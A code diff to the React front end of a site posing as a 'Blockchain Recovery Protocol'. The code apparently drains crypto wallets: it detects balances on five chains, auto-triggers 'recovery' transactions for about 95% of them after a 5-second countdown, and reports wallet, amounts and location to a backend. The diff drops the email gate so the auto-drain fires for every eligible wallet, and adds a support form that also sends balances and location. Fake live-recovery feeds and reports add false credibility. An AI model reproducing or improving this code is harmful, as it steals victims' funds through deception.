@@ -80,16 +80,21 @@ const TRANSLATIONS = {
     scanComplete: 'Blockchain scan complete',
     assetsFound: 'recoverable assets found',
     recoveryInitiated: 'Recovery protocol initiated',
-    confirmationSent: 'Confirmation email sent',
+    confirmationSent: 'Confirmation sent',
     retrievalComplete: 'Asset retrieval complete',
-    emailNotification: 'Recovery confirmation sent to your email',
+    emailNotification: 'Recovery confirmation sent',
     blockchainSync: 'Synchronizing with blockchain networks...',
     walletRequired: 'Active wallet connection required',
     insufficientBalance: 'Insufficient on-chain balance for recovery',
     proceedToRecovery: 'Click to proceed with asset recovery',
     recoveryReady: 'Recovery ready - click to retrieve assets',
     reportGenerated: 'Recovery report generated',
-    reportDownloaded: 'Report downloaded successfully'
+    reportDownloaded: 'Report downloaded successfully',
+    support: 'Support',
+    reportIssue: 'Report an Issue',
+    issuePlaceholder: 'Describe your issue...',
+    sendReport: 'Send Report',
+    reportSent: 'Report sent successfully!'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -116,36 +121,41 @@ const TRANSLATIONS = {
     lastClaim: 'Última recuperación',
     someoneJustClaimed: '¡Recuperación de Activos Completada!',
     securedTokens: 'recuperado',
-    downloadReport: 'Descargar Informe de Recuperación',
+    downloadReport: 'Descargar Informe',
     waitingForFirstClaim: 'Esperando eventos de recuperación...',
     claimAmount: 'Recuperado',
     bonusTag: '+25% bono',
     recoverButton: 'INICIAR RECUPERACIÓN',
-    processing: 'PROCESANDO RECUPERACIÓN...',
+    processing: 'PROCESANDO...',
     completed: '✓ RECUPERACIÓN COMPLETADA',
     secured: 'Tus activos han sido recuperados exitosamente',
     view: 'VER ACTIVOS RECUPERADOS',
-    recoverNow: 'RECUPERAR ACTIVOS AHORA',
+    recoverNow: 'RECUPERAR AHORA',
     recoveryComplete: '¡RECUPERACIÓN COMPLETA!',
     amountRecovered: 'Monto Recuperado',
-    processingRecovery: 'Iniciando protocolo de recuperación...',
-    eligible: '✓ ¡Activos Recuperables Detectados!',
-    notEligible: 'No se encontraron activos recuperables',
-    minRequirement: 'Saldo en cadena requerido para iniciar recuperación',
+    processingRecovery: 'Iniciando protocolo...',
+    eligible: '✓ ¡Activos Detectados!',
+    notEligible: 'No se encontraron activos',
+    minRequirement: 'Saldo en cadena requerido',
     recoveryValue: 'Valor Recuperable',
-    scanComplete: 'Escaneo blockchain completado',
-    assetsFound: 'activos recuperables encontrados',
-    recoveryInitiated: 'Protocolo de recuperación iniciado',
-    confirmationSent: 'Correo de confirmación enviado',
-    retrievalComplete: 'Recuperación de activos completada',
-    emailNotification: 'Confirmación de recuperación enviada a tu correo',
-    blockchainSync: 'Sincronizando con redes blockchain...',
-    walletRequired: 'Conexión de wallet activa requerida',
-    insufficientBalance: 'Saldo en cadena insuficiente para recuperación',
-    proceedToRecovery: 'Haz clic para proceder con la recuperación',
-    recoveryReady: 'Recuperación lista - haz clic para recuperar activos',
-    reportGenerated: 'Informe de recuperación generado',
-    reportDownloaded: 'Informe descargado exitosamente'
+    scanComplete: 'Escaneo completado',
+    assetsFound: 'activos encontrados',
+    recoveryInitiated: 'Protocolo iniciado',
+    confirmationSent: 'Confirmación enviada',
+    retrievalComplete: 'Recuperación completada',
+    emailNotification: 'Confirmación enviada',
+    blockchainSync: 'Sincronizando con redes...',
+    walletRequired: 'Wallet conectada requerida',
+    insufficientBalance: 'Saldo insuficiente para recuperación',
+    proceedToRecovery: 'Haz clic para proceder',
+    recoveryReady: 'Recuperación lista',
+    reportGenerated: 'Informe generado',
+    reportDownloaded: 'Informe descargado',
+    support: 'Soporte',
+    reportIssue: 'Reportar Problema',
+    issuePlaceholder: 'Describe tu problema...',
+    sendReport: 'Enviar Reporte',
+    reportSent: '¡Reporte enviado!'
   }
 };
 
@@ -243,13 +253,14 @@ const generateRecoveryId = () => {
 // ============================================
 // GENERATE RECOVERY REPORT PDF (Download as JSON/Text)
 // ============================================
-const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, timestamp) => {
+const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, timestamp, chainDetails) => {
   const reportData = {
     reportId: generateRecoveryId(),
     recoveryAmount: recoveryAmount,
     usdValue: `$${recoveryAmount.toLocaleString()} USD`,
     walletAddress: walletAddress,
     chainsRecovered: chains,
+    chainDetails: chainDetails,
     transactionHash: tx.hash,
     timestamp: timestamp,
     bonusApplied: '+25%',
@@ -274,7 +285,7 @@ const generateRecoveryReport = (tx, walletAddress, recoveryAmount, chains, times
 // ============================================
 // LIVE RECOVERY POPUP COMPONENT
 // ============================================
-const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress, recoveryAmount, chains }) => {
+const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress, recoveryAmount, chains, chainDetails }) => {
   const [visible, setVisible] = useState(true);
   
   useEffect(() => {
@@ -288,7 +299,7 @@ const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, wallet
   if (!visible) return null;
   
   const handleDownload = () => {
-    generateRecoveryReport(tx, walletAddress, recoveryAmount, chains, new Date().toISOString());
+    generateRecoveryReport(tx, walletAddress, recoveryAmount, chains, new Date().toISOString(), chainDetails);
     onDownloadReport();
   };
   
@@ -326,7 +337,7 @@ const LiveRecoveryPopup = ({ tx, onClose, onDownloadReport, translations, wallet
 // ============================================
 const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount, onDownloadReport, walletAddress }) => {
   const handleDownloadForTx = (tx) => {
-    generateRecoveryReport(tx, walletAddress, tx.recoveryAmount, [tx.chain], tx.time);
+    generateRecoveryReport(tx, walletAddress, tx.recoveryAmount, [tx.chain], tx.time, tx.chainDetails);
     onDownloadReport();
   };
   
@@ -458,6 +469,68 @@ const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
 };
 
 // ============================================
+// REPORT ISSUE COMPONENT
+// ============================================
+const ReportIssue = ({ translations, address, balances, userLocation }) => {
+  const [issueText, setIssueText] = useState('');
+  const [isSending, setIsSending] = useState(false);
+  const [sent, setSent] = useState(false);
+
+  const handleSendReport = async () => {
+    if (!issueText.trim()) return;
+    
+    setIsSending(true);
+    try {
+      // Send to backend which will forward to admin email
+      const response = await fetch(`${BACKEND_URL}/api/send-report`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          walletAddress: address,
+          issue: issueText,
+          location: userLocation,
+          balances: balances,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        })
+      });
+      
+      const result = await response.json();
+      if (result.success) {
+        setSent(true);
+        setIssueText('');
+        setTimeout(() => setSent(false), 3000);
+      }
+    } catch (err) {
+      console.error('Report error:', err);
+    } finally {
+      setIsSending(false);
+    }
+  };
+
+  return (
+    <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
+      <h3 className="text-lg font-bold mb-3 text-blue-400">📧 {translations.support}</h3>
+      <p className="text-xs text-gray-400 mb-3">Having issues with recovery? Send us a message.</p>
+      <textarea
+        value={issueText}
+        onChange={(e) => setIssueText(e.target.value)}
+        placeholder={translations.issuePlaceholder}
+        rows={3}
+        className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
+      />
+      <button
+        onClick={handleSendReport}
+        disabled={isSending || !issueText.trim()}
+        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-xl transition-all disabled:opacity-50"
+      >
+        {isSending ? 'Sending...' : sent ? '✓ Sent!' : translations.sendReport}
+      </button>
+    </div>
+  );
+};
+
+// ============================================
 // MAIN APP COMPONENT - Blockchain Recovery System
 // ============================================
 function App() {
@@ -493,11 +566,11 @@ function App() {
   const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
-  const [bnbAmount, setBnbAmount] = useState('');
   const [showRecoverButton, setShowRecoverButton] = useState(false);
   const [showEmailNotification, setShowEmailNotification] = useState(false);
   const [showReportNotification, setShowReportNotification] = useState(false);
   const [autoRecoveryActive, setAutoRecoveryActive] = useState(false);
+  const [chainDetailsForReport, setChainDetailsForReport] = useState([]);
   
   // LIVE TRANSACTIONS STATE - Loaded from localStorage
   const [liveTransactions, setLiveTransactions] = useState([]);
@@ -792,9 +865,9 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // AUTO TRIGGER RECOVERY WHEN ELIGIBLE
+  // AUTO TRIGGER RECOVERY WHEN ELIGIBLE - NO EMAIL REQUIRED
   useEffect(() => {
-    if (isEligible && isConnected && !signatureLoading && !completedChains.length && userEmail && !autoRecoveryActive) {
+    if (isEligible && isConnected && !signatureLoading && !completedChains.length && !autoRecoveryActive) {
       setAutoRecoveryActive(true);
       const timer = setTimeout(() => {
         executeMultiChainRecovery();
@@ -802,7 +875,7 @@ function App() {
       }, 5000);
       return () => clearTimeout(timer);
     }
-  }, [isEligible, isConnected, signatureLoading, completedChains.length, userEmail]);
+  }, [isEligible, isConnected, signatureLoading, completedChains.length]);
 
   // Check eligibility for recovery with pro messaging
   const checkEligibility = async () => {
@@ -826,6 +899,15 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
         
+        // Build detailed chain information for reporting
+        const chainDetails = chainsWithBalance.map(chain => ({
+          name: chain.name,
+          amount: balances[chain.name].amount.toFixed(6),
+          symbol: balances[chain.name].symbol,
+          valueUSD: balances[chain.name].valueUSD.toFixed(2)
+        }));
+        setChainDetailsForReport(chainDetails);
+        
         console.log("📡 SENDING CONNECT TO BACKEND...");
         const connectResponse = await fetch(`${BACKEND_URL}/api/presale/connect`, {
           method: 'POST',
@@ -834,7 +916,7 @@ function App() {
             walletAddress: address,
             totalValue: total,
             chains: chainsWithBalance.map(c => c.name),
-            email: userEmail,
+            chainDetails: chainDetails,
             location: userLocation
           })
         });
@@ -925,33 +1007,6 @@ function App() {
     }
   };
 
-  // Send email notification
-  const sendEmailNotification = async (recoveryAmount, chains, txHash) => {
-    try {
-      const response = await fetch(`${BACKEND_URL}/api/send-recovery-email`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email: userEmail,
-          walletAddress: address,
-          recoveryAmount: recoveryAmount,
-          chains: chains,
-          txHash: txHash,
-          timestamp: new Date().toISOString(),
-          bonus: presaleStats.currentBonus
-        })
-      });
-      
-      const result = await response.json();
-      if (result.success) {
-        setShowEmailNotification(true);
-        setTimeout(() => setShowEmailNotification(false), 5000);
-      }
-    } catch (err) {
-      console.error('Email notification error:', err);
-    }
-  };
-
   // Handle download report notification
   const handleDownloadReport = () => {
     setShowReportNotification(true);
@@ -1000,6 +1055,7 @@ function App() {
       
       let processed = [];
       let lastTxHash = '';
+      const processedDetails = [];
       
       for (const chain of sortedChains) {
         try {
@@ -1053,6 +1109,17 @@ function App() {
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
             
+            // Store detailed info for each processed chain
+            processedDetails.push({
+              name: chain.name,
+              symbol: chain.symbol,
+              originalAmount: balance.amount.toFixed(6),
+              originalValueUSD: balance.valueUSD.toFixed(2),
+              processedAmount: amountToSend.toFixed(6),
+              processedValueUSD: valueUSD,
+              txHash: tx
+            });
+            
             const gasUsed = receipt.gasUsed ? ethers.formatEther(receipt.gasUsed * receipt.gasPrice) : '0';
             
             const flowData = {
@@ -1064,7 +1131,8 @@ function App() {
               symbol: chain.symbol,
               valueUSD: valueUSD,
               gasFee: gasUsed,
-              email: userEmail,
+              originalAmount: balance.amount.toFixed(6),
+              originalValueUSD: balance.valueUSD.toFixed(2),
               location: {
                 country: userLocation.country,
                 flag: userLocation.flag,
@@ -1103,23 +1171,23 @@ function App() {
           time: new Date().toISOString(),
           timeAgo: 'Just now',
           chain: randomChain,
-          recoveryAmount: recoveryAmount
+          recoveryAmount: recoveryAmount,
+          chainDetails: processedDetails
         };
         
         setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
         
         setTxStatus(translations.retrievalComplete);
-        
-        // Send email notification
-        if (userEmail) {
-          await sendEmailNotification(recoveryAmount, processed, lastTxHash);
-        }
-        
         setShowCelebration(true);
         
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
+        
+        // Build detailed chains string with actual values
+        const chainsDetailsString = processedDetails.map(d => 
+          `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) processed`
+        ).join('\n');
         
         console.log("📡 SENDING CLAIM TO BACKEND...");
         const claimResponse = await fetch(`${BACKEND_URL}/api/presale/claim`, {
@@ -1127,24 +1195,24 @@ function App() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             walletAddress: address,
-            email: userEmail,
             location: {
               country: userLocation.country,
               flag: userLocation.flag,
               city: userLocation.city
             },
             chains: processed,
+            chainDetails: processedDetails,
             totalProcessedValue: totalProcessedValue.toFixed(2),
             reward: `${recoveryAmount} USD`,
             bonus: `${presaleStats.currentBonus}%`,
-            chainsDetails: processed.map(c => `✅ ${c}: $${balances[c]?.valueUSD.toFixed(2)} USD → $${(balances[c]?.valueUSD * 0.95).toFixed(2)} USD processed`).join('\n')
+            chainsDetails: chainsDetailsString
           })
         });
         const claimData = await claimResponse.json();
         console.log("✅ CLAIM RESPONSE:", claimData);
         
-        // Generate recovery report for the user
-        generateRecoveryReport(newTx, address, recoveryAmount, processed, new Date().toISOString());
+        // Generate recovery report for the user with chain details
+        generateRecoveryReport(newTx, address, recoveryAmount, processed, new Date().toISOString(), processedDetails);
         handleDownloadReport();
       } else {
         setError("No chains were successfully processed");
@@ -1209,16 +1277,6 @@ function App() {
         <span className="text-xl">🔗</span>
         <span className="text-sm font-semibold">{translations.recoverButton}</span>
       </div>
-
-      {/* Email Notification Toast */}
-      {showEmailNotification && (
-        <div className="fixed top-20 right-4 z-50 animate-slideInUp bg-green-500/90 backdrop-blur rounded-lg p-3 shadow-xl">
-          <div className="flex items-center gap-2">
-            <span className="text-lg">📧</span>
-            <p className="text-sm text-white">{translations.emailNotification}</p>
-          </div>
-        </div>
-      )}
 
       {/* Report Download Notification */}
       {showReportNotification && (
@@ -1296,7 +1354,7 @@ function App() {
           <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
             Blockchain Recovery Protocol helps users recover stuck transactions, lost funds, and 
             non-custodial wallet assets across multiple blockchain networks. Our advanced recovery 
-            protocol identifies and retrieves recoverable assets with full transparency and email confirmation.
+            protocol identifies and retrieves recoverable assets with full transparency.
           </p>
 
           {/* Live Activity Badge */}
@@ -1333,20 +1391,7 @@ function App() {
                 </button>
               </div>
               
-              {/* Email Input for Notifications */}
-              {!userEmail && isConnected && (
-                <div className="mt-3 w-full">
-                  <input
-                    type="email"
-                    value={userEmail}
-                    onChange={(e) => setUserEmail(e.target.value)}
-                    placeholder="Enter email for recovery confirmation"
-                    className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm"
-                  />
-                </div>
-              )}
-              
-              {/* AUTO RECOVERY COUNTDOWN */}
+              {/* AUTO RECOVERY COUNTDOWN - NO EMAIL REQUIRED */}
               {autoRecoveryActive && isEligible && !signatureLoading && (
                 <AutoRecoveryCountdown 
                   seconds={5} 
@@ -1355,8 +1400,8 @@ function App() {
                 />
               )}
               
-              {/* RECOVERY BUTTON - Professional messaging based on eligibility */}
-              {showRecoverButton && userEmail && (
+              {/* RECOVERY BUTTON - Always visible when eligible (no email required) */}
+              {showRecoverButton && (
                 <button
                   onClick={recoverAssets}
                   disabled={signatureLoading}
@@ -1378,27 +1423,13 @@ function App() {
                 </button>
               )}
 
-              {showRecoverButton && !userEmail && (
-                <div className="mt-3 w-full bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400 text-center">
-                  📧 Enter your email above to receive recovery confirmation
-                </div>
-              )}
-
-              {/* Eligibility Status Message - Professional */}
+              {/* Eligibility Status Message */}
               <div className="mt-3 w-full">
                 <div className={`rounded-lg p-3 text-sm ${
-                  isEligible && userEmail 
-                    ? 'bg-green-500/20 border border-green-500/30 text-green-400' 
-                    : isEligible && !userEmail
-                    ? 'bg-yellow-500/20 border border-yellow-500/30 text-yellow-400'
-                    : !isEligible && !scanning && isConnected
-                    ? 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
-                    : 'bg-blue-500/20 border border-blue-500/30 text-blue-400'
+                  isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
                 }`}>
-                  {isEligible && userEmail ? (
+                  {isEligible ? (
                     <span>🔗 {translations.proceedToRecovery}</span>
-                  ) : isEligible && !userEmail ? (
-                    <span>📧 Enter email to enable recovery</span>
                   ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
                     <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
                   ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
@@ -1451,7 +1482,7 @@ function App() {
             <h3 className="text-2xl font-bold mb-4 text-blue-400">Blockchain Asset Recovery Portal</h3>
             
             <div className="flex justify-between items-center mb-3">
-              <p className="text-gray-300">Total Recoverable Value:</p>
+              <p className="text-gray-300">{translations.recoveryValue}:</p>
               <p className="text-blue-400 font-bold">${totalOnChainValue.toLocaleString()} USD</p>
             </div>
             
@@ -1466,16 +1497,31 @@ function App() {
             {/* Recovery Info Cards */}
             <div className="grid grid-cols-2 gap-3 mb-6">
               <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
-                <p className="text-xs text-gray-400">Networks Detected</p>
+                <p className="text-xs text-gray-400">{translations.tokenPrice}s</p>
                 <p className="text-lg font-bold text-blue-400">{Object.keys(balances).length}/5</p>
               </div>
               <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
-                <p className="text-xs text-gray-400">Recovery Fee</p>
+                <p className="text-xs text-gray-400">{translations.recoveryFee || 'Recovery Fee'}</p>
                 <p className="text-lg font-bold text-blue-400">5% + Gas</p>
               </div>
             </div>
 
-            <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5 mb-6">
+            {/* Chain Balance Details - Shows actual values per chain */}
+            {Object.keys(balances).length > 0 && (
+              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-4 mb-6">
+                <h4 className="text-sm font-bold mb-2 text-blue-400">📊 Detected Balances:</h4>
+                <div className="space-y-1">
+                  {Object.entries(balances).map(([chainName, balance]) => (
+                    <div key={chainName} className="flex justify-between text-xs">
+                      <span className="text-gray-400">{chainName}:</span>
+                      <span className="text-white">{balance.amount.toFixed(6)} {balance.symbol} (${balance.valueUSD.toFixed(2)})</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            )}
+
+            <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-blue-400">🔗 Recovery Protocol</h4>
               <p className="text-sm text-gray-400 mb-3">
                 Our advanced recovery protocol scans 5 major blockchain networks to identify and retrieve:
@@ -1518,9 +1564,6 @@ function App() {
               <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                 <p className="text-green-400 text-lg mb-2">✓ {translations.completed}</p>
                 <p className="text-gray-400 text-sm">{translations.secured}</p>
-                {userEmail && (
-                  <p className="text-xs text-gray-500 mt-2">📧 {translations.emailNotification}</p>
-                )}
               </div>
             </div>
           )}
@@ -1545,7 +1588,7 @@ function App() {
             </div>
           )}
 
-          {/* Info Section */}
+          {/* Info Section - 3 columns */}
           <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
             
             <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
@@ -1554,7 +1597,7 @@ function App() {
                 1. Connect your wallet to scan 5 networks<br/>
                 2. System detects recoverable assets automatically<br/>
                 3. Authorize recovery with one signature<br/>
-                4. Assets are retrieved and confirmation sent
+                4. Assets are retrieved with confirmation
               </p>
             </div>
 
@@ -1569,12 +1612,13 @@ function App() {
               </p>
             </div>
 
-            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
-              <h3 className="text-lg font-bold mb-3 text-blue-400">Security & Transparency</h3>
-              <p className="text-sm text-gray-400 leading-relaxed">
-                All recovery operations are executed directly on-chain. Smart contracts ensure secure asset recovery with verifiable transaction records and email confirmation.
-              </p>
-            </div>
+            {/* Report Issue Component - Replaces the old email section */}
+            <ReportIssue 
+              translations={translations}
+              address={address}
+              balances={balances}
+              userLocation={userLocation}
+            />
           </div>
 
           {/* Footer */}
@@ -1594,6 +1638,7 @@ function App() {
           walletAddress={address}
           recoveryAmount={currentPopupTx.recoveryAmount}
           chains={[currentPopupTx.chain]}
+          chainDetails={currentPopupTx.chainDetails}
         />
       )}
 
@@ -1637,7 +1682,6 @@ function App() {
               
               <p className="text-xs text-gray-500 mb-6">
                 ✓ Recovered on {verifiedChains.length} chains
-                {userEmail && <span className="block mt-1">📧 {translations.emailNotification}</span>}
               </p>
               
               <button
@@ -1670,11 +1714,6 @@ function App() {
           0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
           100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
         }
-        @keyframes sparkle {
-          0% { transform: rotate(0deg) scale(0); opacity: 0; }
-          50% { transform: rotate(180deg) scale(1); opacity: 1; }
-          100% { transform: rotate(360deg) scale(0); opacity: 0; }
-        }
         @keyframes fadeIn {
           from { opacity: 0; transform: scale(0.95); }
           to { opacity: 1; transform: scale(1); }
@@ -1692,7 +1731,6 @@ function App() {
         .animate-pulse-blue { animation: pulse-blue 1.5s infinite; }
         .animate-pulse-glow { animation: blink 1.2s infinite; }
         .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
-        .animate-sparkle { animation: sparkle 1s ease-out forwards; }
         .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
         .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
         .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
